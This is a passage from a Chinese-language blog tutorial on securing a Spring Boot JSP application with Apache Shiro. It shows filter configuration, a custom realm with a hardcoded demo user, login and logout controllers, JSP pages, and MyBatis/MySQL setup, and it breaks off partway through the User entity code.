 <span class="comment">//authc请求这个资源需要认证和授权</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//默认认证界面路径</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line"></span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 创建安全管理器</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给安全管理器设置realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 创建自定义realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同时还需要一个shiro.realms包来自定义realm<br>CustomerRealm.java<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后运行访问一下index.jsp 要是成功跳转到了login.jsp  那就证明index.jsp现在是受保护的了</p>
<h2 id="实现认证与退出"><a href="#实现认证与退出" class="headerlink" title="实现认证与退出"></a>实现认证与退出</h2><p>这个例子并没有连接数据库，使用一个值来进行演示</p>
<p>由于config肯定不能进行直接访问，所以我们需要一个controller<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"user"</span>)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 退出登录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"logout"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String logout()&#123;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        subject.logout(); <span class="comment">//退出登录</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用来处理身份验证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"login"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String login(String username,String password)&#123;</span><br><span class="line">        <span class="comment">//获取主体对象</span></span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(new UsernamePasswordToken(username,password));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/index.jsp"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownAccountException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"用户名错误"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"密码错误"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>同时也要去修改一下Realm<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"====================================="</span>);</span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,<span class="string">"123"</span>,<span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Config也需要进行修改<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用来整合Shiro框架的配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. 创建shiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给filter设置安全管理器</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置系统受限资源</span></span><br><span class="line">        <span class="comment">//配置系统公共资源</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/login"</span>,<span class="string">"anon"</span>); <span class="comment">//anon 设置为公共资源</span></span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/**"</span>,<span class="string">"authc"</span>);  <span class="comment">//authc 请求这个资源需要认证和授权</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//默认认证界面路径</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 创建安全管理器</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给安全管理器设置realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 创建自定义realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面都有了之后，就可以修改一下index.jsp和login.jsp了</p>
<p>index.jsp<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>系统主页V1.0<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/logout"</span>&gt;</span>退出用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>商品管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>订单管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>物流管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>login.jsp<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>登陆页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/login"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这样就完成了认证和退出</p>
<p>思路很简单，就是写一个controller控制器，去获取主体subject，并且调用subject中的login和logout方法去实现认证和退出，并且完成一下重定向的操作</p>
<p>subject呢会自动的注入到realm的配置中，所以可以直接使用</p>
<p>而realm中,为了方便演示，没有连接数据库去进行操作，使用了一个值去模拟登录和退出</p>
<p>连接数据库只需要去替换一下就可以了</p>
<h2 id="连接数据库-MD5-Salt注册功能"><a href="#连接数据库-MD5-Salt注册功能" class="headerlink" title="连接数据库+MD5+Salt注册功能"></a>连接数据库+MD5+Salt注册功能</h2><p>MD5+Salt不仅是用于用户认证，在用户注册时就应该去进行一下MD5+Salt的操作</p>
<p>首先肯定是要有个注册页面了register.jsp<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>用户注册<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/register"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"立即注册"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>还要将它和请求都设置为公共资源<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/register"</span>,<span class="string">"anon"</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/register.jsp"</span>,<span class="string">"anon"</span>);</span><br></pre></td></tr></table></figure></p>
<p>接下来就是新建一个数据库<br><img src="/img/JavaWeb/11-30学习日记/1.png" alt="avatar"></p>
<p>除此之外还要添加mysql和mybatis相关的依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        mabatis相关依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        mysql依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        druid--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>配置文件同样也要加上<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">spring<span class="selector-class">.datasource</span>.type=com<span class="selector-class">.alibaba</span><span class="selector-class">.druid</span><span class="selector-class">.pool</span>.DruidDataSource</span><br><span class="line">spring<span class="selector-class">.datasource</span>.driver-class-name=com<span class="selector-class">.mysql</span><span class="selector-class">.cj</span><span class="selector-class">.jdbc</span>.Driver</span><br><span class="line">spring<span class="selector-class">.datasource</span>.url=jdbc:mysql:<span class="comment">//localhost:3306/shiro_spring?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8&amp;useSSL=false</span></span><br><span class="line">spring<span class="selector-class">.datasource</span>.username=root</span><br><span class="line">spring<span class="selector-class">.datasource</span>.password=root</span><br><span class="line"></span><br><span class="line">mybatis.type-aliases-package=com<span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span>.entity</span><br><span class="line">mybatis.mapper-locations=classpath:com/ceit/mapper<span class="comment">/*.xml</span></span><br></pre></td></tr></table></figure></p>
<p>在resources下建一个com.ceit.mapper包用于存放mapper配置文件</p>
<p>在com.ceit.springboot_jsp_shiro下建一个entity包 创建一个User.java<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> salt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalt</span><span class="params">(<span class="keyword">String</span> salt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.salt = 